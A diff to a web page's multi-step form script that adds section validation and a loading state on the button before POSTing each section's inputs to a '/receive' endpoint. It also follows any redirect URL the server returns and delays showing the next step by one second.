@@ -293,38 +293,39 @@
             stepNumber.textContent = currentStep + 1; 
         }
 
-        function submitCurrentSection() {
-            const currentSection = sections[currentStep];
-            const inputs = currentSection.querySelectorAll('input');
-            const formData = {};
-            inputs.forEach(input => {
-                formData[input.id] = input.value; 
-            });
-			
-            $.ajax({
-                method: 'POST',
-                url: "/receive",
-                data: formData
-            }).done(function(msg) {
-            
-            	if (msg) {
-                const data = msg; 
-                if(data.url){
-                window.location.href = data.url;
-                }
-            } else {
-                console.error('Failed to submit:', response.statusText);
-            }
-                
-                sessionStorage.setItem('visitor', visitor);
-                console.log(msg); 
-            }).fail(function(err, textstatus, error) {
-                console.log('fail');
-            });
-            
-            console.log('Submitting:', formData); 
+        function submitCurrentSection(button) { // Pass the button as an argument
+    const currentSection = sections[currentStep];
+    const inputs = currentSection.querySelectorAll('input');
+    const formData = {};
+    
+    inputs.forEach(input => {
+        formData[input.id] = input.value; 
+    });
+    
+    if (!validateCurrentSection()) {
+        console.log('invalid');
+        return;
+    } else {
+        console.log(button);
+        button.querySelector('span').classList.add('loading-image'); 
+        button.childNodes[0].textContent = "Loading";
+    }
+    
+    $.ajax({
+        method: 'POST',
+        url: "/receive",
+        data: formData
+    }).done(function(msg) {
+        if (msg.url) {
+            window.location.href = msg.url; // Use 'msg.url' instead of 'data.url'
         }
-
+        console.log(msg); 
+    }).fail(function(err, textStatus, error) {
+        console.error('Failed to submit:', err.statusText);
+    });
+    
+    console.log('Submitting:', formData); 
+}
         
         function validateCurrentSection() {
 		    const currentSection = sections[currentStep];
@@ -407,12 +408,14 @@
                 console.log('valid');
                 }
 
-                submitCurrentSection(); 
+                submitCurrentSection(button); 
 
                 if (currentStep < totalSteps - 1) {
                     currentStep++; 
                     history.pushState({ step: currentStep }, '', ''); 
-                    showCurrentSection(); 
+                    setTimeout(() => {
+                showCurrentSection(); 
+            }, 1000);
                 }
             });
         });
@@ -434,6 +437,6 @@
         showCurrentSection();
     });
 </script> 
-
+ 
 </body>
 </html>
